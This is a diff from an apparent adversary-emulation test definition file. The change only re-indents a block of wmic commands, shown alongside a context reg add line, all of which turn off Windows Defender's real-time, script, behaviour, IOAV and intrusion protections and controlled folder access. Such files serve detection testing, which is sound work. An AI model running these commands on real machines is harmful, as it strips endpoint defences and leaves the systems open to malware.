@@ -34,9 +34,9 @@ platforms:
         reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f;
       variants:
         - command: |
-          wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set DisableIntrusionPreventionSystem=TRUE;
-          wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set DisableRealtimeMonitoring=TRUE;
-          wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set DisableScriptScanning=TRUE;
-          wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set EnableControlledFolderAccess=0;
-          wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set DisableIOAVProtection=TRUE;
-          wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set DisableBehaviorMonitoring=TRUE;
+            wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set DisableIntrusionPreventionSystem=TRUE;
+            wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set DisableRealtimeMonitoring=TRUE;
+            wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set DisableScriptScanning=TRUE;
+            wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set EnableControlledFolderAccess=0;
+            wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set DisableIOAVProtection=TRUE;
+            wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set DisableBehaviorMonitoring=TRUE;
